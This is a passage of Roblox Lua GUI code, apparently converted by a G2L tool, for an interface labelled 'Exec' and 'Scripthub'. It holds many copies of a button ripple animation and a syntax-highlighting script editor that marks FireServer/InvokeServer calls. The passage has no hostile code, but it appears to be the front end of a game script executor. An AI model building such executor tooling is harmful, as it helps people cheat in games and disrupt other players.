task.spawn(C_45);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_49()
local script = G2L["49"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_49);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_4d()
local script = G2L["4d"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_4d);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_51()
local script = G2L["51"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_51);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_55()
local script = G2L["55"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_55);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_59()
local script = G2L["59"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_59);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_5d()
local script = G2L["5d"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_5d);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_61()
local script = G2L["61"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_61);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_65()
local script = G2L["65"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_65);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_69()
local script = G2L["69"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_69);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_6d()
local script = G2L["6d"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_6d);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_71()
local script = G2L["71"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_71);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_75()
local script = G2L["75"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_75);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_79()
local script = G2L["79"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_79);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_7d()
local script = G2L["7d"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_7d);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_81()
local script = G2L["81"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_81);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_85()
local script = G2L["85"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_85);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_89()
local script = G2L["89"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_89);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_8d()
local script = G2L["8d"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)
	
end;
task.spawn(C_8d);
-- StarterGui.ScreenGui.Exec.Scripthub.ScrollingFrame.TextButton.LocalScript
local function C_91()
local script = G2L["91"];
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	button.ClipsDescendants = true
	
	local function createRipple()
		local ripple = Instance.new("Frame")
		ripple.Size = UDim2.new(0, 0, 0, 0)
		ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
		ripple.AnchorPoint = Vector2.new(0.5, 0.5)
		ripple.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ripple.BackgroundTransparency = 0.5
		ripple.BorderSizePixel = 0
		ripple.Parent = button
		ripple.ZIndex = button.ZIndex + 1
	
		local corner = Instance.new("UICorner")
		corner.CornerRadius = UDim.new(1, 0)
		corner.Parent = ripple
	
		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
		local tween = TweenService:Create(ripple, tweenInfo, {
			Size = UDim2.new(2, 0, 1, 0),
			BackgroundTransparency = 1
		})
	
		tween:Play()
		tween.Completed:Connect(function()
			ripple:Destroy()
		end)
	end
	
	button.MouseButton1Click:Connect(function()
		createRipple()
	end)

end;
task.spawn(C_91);
-- StarterGui.ScreenGui.Exec.Scroll.Editor
local function C_9e()
	local script = G2L["9e"];
	-- Super-rozbudowany edytor Lua do Roblox Studio
	-- Pełna synchronizacja linii, dynamiczne przewijanie, odporność na bugi GUI

	local lua_keywords = {
		"and","break","do","else","elseif","end","false","for","function","goto","if","in",
		"local","nil","not","or","repeat","return","then","true","until","while"
	}

	local global_env = {
		"getrawmetatable","game","workspace","script","math","string","table","print","wait","BrickColor","Color3",
		"next","pairs","ipairs","select","unpack","Instance","Vector2","Vector3","CFrame","Ray","UDim2","Enum",
		"assert","error","warn","tick","loadstring","_G","shared","getfenv","setfenv","newproxy","setmetatable",
		"getmetatable","os","debug","pcall","ypcall","xpcall","rawequal","rawset","rawget","tonumber","tostring",
		"type","typeof","_VERSION","coroutine","delay","require","spawn","LoadLibrary","settings","stats","time",
		"UserSettings","version","Axes","ColorSequence","Faces","ColorSequenceKeypoint","NumberRange","NumberSequence",
		"NumberSequenceKeypoint","gcinfo","elapsedTime","collectgarbage","PhysicalProperties","Rect","Region3",
		"Region3int16","UDim","Vector2int16","Vector3int16"
	}

	local Source = script.Parent:WaitForChild("Code")
	local Lines = Source.Parent:WaitForChild("Lines")
	local Scroll = script.Parent

	local TOKENS = {
		["="]=true,["."]=true,[","]=true,["("]=true,[")"]=true,["["]=true,["]"]=true,
		["{"]=true,["}"]=true,[":"]=true,["*"]=true,["/"]=true,["+"]=true,["-"]=true,
		["%"]=true,[";"]=true,["~"]=true,["<"]=true,[">"]=true
	}

	local MONOSPACE_WIDTH = 8 -- px szerokość znaku monospace dla TextSize = 14 ~ 16
	local LINE_HEIGHT = 18    -- px wysokość linii dla TextSize = 16
	local LINE_NUMBER_PAD = 12 -- dodatkowa szerokość panelu z numerami

	local function maskNonSpaces(str, fn)
		local out = {}
		for i=1,#str do
			local c = str:sub(i,i)
			table.insert(out, fn(c) or " ")
		end
		return table.concat(out)
	end

	local function Highlight(str, keywords)
		local set = {}
		for _,kw in ipairs(keywords) do set[kw] = true end
		str = str:gsub(".", function(c) return TOKENS[c] and " " or c end)
		return str:gsub("%S+", function(c) return set[c] and c or string.rep(" ", #c) end)
	end

	local function hTokens(str)
		return maskNonSpaces(str,function(c) return TOKENS[c] and c end)
	end

	local function strings(str)
		local out, i = {}, 1
		while i <= #str do
			local c = str:sub(i,i)
			if c == "\"" or c == "'" then
				local quote = c
				table.insert(out,c)
				i = i + 1
				while i <= #str and str:sub(i,i) ~= quote do
					table.insert(out,str:sub(i,i))
					i = i + 1
				end
				if i <= #str then table.insert(out,str:sub(i,i)) end
			elseif c == "[" and str:sub(i,i+1) == "[[" then
				table.insert(out,"[[")
				i = i + 2
				while i <= #str-1 and str:sub(i,i+1) ~= "]]" do
					table.insert(out,str:sub(i,i))
					i = i + 1
				end
				table.insert(out,"]]")
				i = i + 1
			else
				table.insert(out, " ")
			end
			i = i + 1
		end
		return table.concat(out)
	end

	local function numbers(str)
		return str:gsub("%d+", function(num) return num end)
	end

	local function comments(str)
		local out = {}
		local i = 1
		while i <= #str do
			if str:sub(i,i+1) == "--" then
				local j = i
				if str:sub(i+2,i+3) == "[[" then
					j = i + 4
					while j <= #str-1 and str:sub(j,j+1) ~= "]]" do j = j + 1 end
					j = j + 1
				else
					j = i + 2
					while j <= #str and str:sub(j,j) ~= "\n" do j = j + 1 end
				end
				for k=i,j do table.insert(out,str:sub(k,k)) end
				i = j
			else
				table.insert(out," ")
			end
			i = i + 1
		end
		return table.concat(out)
	end

	local function getLines(text)
		local lines = {}
		for line in string.gmatch(text, "([^\n]*)\n?") do
			table.insert(lines, line)
		end
		return lines
	end

	local function getNumLines(text)
		local lines = getLines(text or Source.Text)
		return #lines
	end

	local function getLongestLine(text)
		local longest = 0
		for _,line in ipairs(getLines(text or Source.Text)) do
			line = line:gsub("\t", "    ")
			local len = utf8.len(line) or #line
			if len > longest then
				longest = len
			end
		end
		return longest
	end

	local function getLineNumberWidth(numLines)
		-- Dynamiczna szerokość na numerki (np. 1...9999)
		local digits = math.max(2, tostring(numLines):len())
		return (digits * MONOSPACE_WIDTH) + LINE_NUMBER_PAD
	end

	local function highlight_source(prop)
		if prop=="Text" or prop=="CursorPosition" then
			local s = Source.Text:gsub("\13",""):gsub("\t","    ")
			Source.Keywords_.Text = Highlight(s,lua_keywords)
			Source.Globals_.Text = Highlight(s,global_env)
			Source.RemoteHighlight_.Text = Highlight(s,{"FireServer","InvokeServer"})
			Source.Tokens_.Text = hTokens(s)
			Source.Numbers_.Text = numbers(s)
			Source.Strings_.Text = strings(s)
			Source.Comments_.Text = comments(s)

			local linesArr = getLines(s)
			local totalLines = #linesArr
			local lineStr = ""
			for i=1,totalLines do
				lineStr = lineStr..i.."\n"
			end
			Lines.Text = lineStr

			-- Szerokość CanvasSize: najdłuższa linia (monospace), minimalna szerokość Scroll
			local longestLine = getLongestLine(s)
			local minWidth = Scroll.AbsoluteSize.X
			local editorWidth = math.max(longestLine * MONOSPACE_WIDTH + 40, minWidth)
			local canvasHeight = math.max(totalLines * LINE_HEIGHT + 8, Scroll.AbsoluteSize.Y)

			Scroll.CanvasSize = UDim2.new(0, editorWidth, 0, canvasHeight)

			-- Panel z numerami: dynamiczna szerokość, wysokość = CanvasSize
			Lines.Size = UDim2.new(0, getLineNumberWidth(totalLines), 0, canvasHeight)
			Lines.Position = UDim2.new(0, 0, 0, 0)
			Lines.BackgroundTransparency = 1 -- przezroczyste tło

			-- Synchronizacja appearance
			Lines.Font = Source.Font
			Lines.TextSize = Source.TextSize
			Lines.TextColor3 = Color3.fromRGB(180,180,180)
		end
	end

	local function move_lines()
		Lines.Position = UDim2.new(0, 0, 0, -Scroll.CanvasPosition.Y)
	end

	local function sync_lines_appearance()
		Lines.Font = Source.Font
		Lines.TextSize = Source.TextSize
		Lines.TextColor3 = Color3.fromRGB(180,180,180)
		Lines.BackgroundTransparency = 1
	end

	-- Synchronizacje
	Source.Changed:Connect(highlight_source)
	Source:GetPropertyChangedSignal("Font"):Connect(sync_lines_appearance)
	Source:GetPropertyChangedSignal("TextSize"):Connect(sync_lines_appearance)
	Source:GetPropertyChangedSignal("Size"):Connect(highlight_source)
	Scroll:GetPropertyChangedSignal("CanvasPosition"):Connect(move_lines)

	-- Inicjalizacja
	highlight_source("Text")
	sync_lines_appearance()
	move_lines()

	-- Zabezpieczenie przed bugami (np. Source.Text = nil)
	Source:GetPropertyChangedSignal("Text"):Connect(function()
		if not Source.Text then Source.Text = "" end
	end)

	Lines.ClearTextOnFocus = false
	Lines.TextEditable = false

	-- Fajne rozszerzenie: auto-scroll przy dodaniu nowej linii na końcu
	Source:GetPropertyChangedSignal("Text"):Connect(function()
		local totalLines = getNumLines(Source.Text)
		local scrollY = Scroll.CanvasSize.Y.Offset - Scroll.AbsoluteSize.Y
		if Source.CursorPosition == #Source.Text + 1 and totalLines > 1 then
			Scroll.CanvasPosition = Vector2.new(Scroll.CanvasPosition.X, scrollY)
		end
	end)

	-- Obsługa bardzo dużych plików: limituj do 5000 linii (możesz zwiększyć ten limit)
	Source:GetPropertyChangedSignal("Text"):Connect(function()
		if getNumLines(Source.Text) > 5000 then
			Source.Text = Source.Text:match(("([^\n]*\n?)"):rep(5000))
		end
	end)
end;
task.spawn(C_9e);

return G2L["1"], require;
